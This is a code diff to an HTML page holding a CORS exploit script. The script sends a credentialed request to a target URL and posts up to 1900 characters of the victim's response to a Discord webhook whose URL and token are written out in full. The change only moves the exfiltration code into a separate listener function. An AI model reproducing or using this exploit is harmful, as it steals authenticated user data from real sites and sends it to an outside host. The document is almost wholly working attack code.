@@ -17,21 +17,28 @@
       }
 
       var req = new XMLHttpRequest();
-      req.onload = function() {
-          var data = this.responseText;
-
-          // Exfiltrate to Discord
-          var xhr = new XMLHttpRequest();
-          xhr.open("POST", "https://discord.com/api/webhooks/1407353175672881214/JHPRrs0V8ImR2hEPf7grUVXUdvgdr8Haqa3o_VQrUjm4AOuYjHkFIuommfXRdNirwnlb", true);
-          xhr.setRequestHeader("Content-Type", "application/json");
-          xhr.send(JSON.stringify({
-              "content": "CORS exploit captured data:\n```" + data.substring(0,1900) + "```"
-          }));
-      };
+      req.onload = reqListener;
       req.open("GET", targetUrl, true);
       req.withCredentials = true;
       req.send();
   }
+
+  function reqListener() {
+      var data = this.responseText;
+
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://discord.com/api/webhooks/1407353175672881214/JHPRrs0V8ImR2hEPf7grUVXUdvgdr8Haqa3o_VQrUjm4AOuYjHkFIuommfXRdNirwnlb", true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+
+      // Discord max is 2000 chars, so truncate
+      var safeData = data.substring(0, 1900);
+
+      xhr.send(JSON.stringify({
+          content: "CORS exploit data:\n```" + safeData + "```"
+      }));
+  }
   </script>
 </body>
+</html>
+
 </html>
